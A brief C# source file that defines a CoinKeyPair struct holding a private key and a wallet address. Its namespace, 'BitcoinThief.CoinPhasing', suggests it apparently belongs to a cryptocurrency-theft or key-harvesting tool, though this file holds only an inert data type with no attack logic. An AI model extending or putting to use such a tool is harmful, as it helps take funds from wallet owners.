namespace BitcoinThief.CoinPhasing
{
    /// <summary>
    ///     Represents a crypto key pair.
    /// </summary>
    public struct CoinKeyPair
    {
        /// <summary>
        ///     The key of the crypto key pair.
        /// </summary>
        public readonly string Key;

        /// <summary>
        ///     The address of the crypto key pair.
        /// </summary>
        public readonly string Address;

        /// <summary>
        ///     Initialize a new crypto key pair.
        /// </summary>
        /// <param name="key">The key of the crypto key pair.</param>
        /// <param name="address">The address of the crypto key pair.</param>
        public CoinKeyPair(string key, string address)
        {
            Key = key;
            Address = address;
        }
    }
}
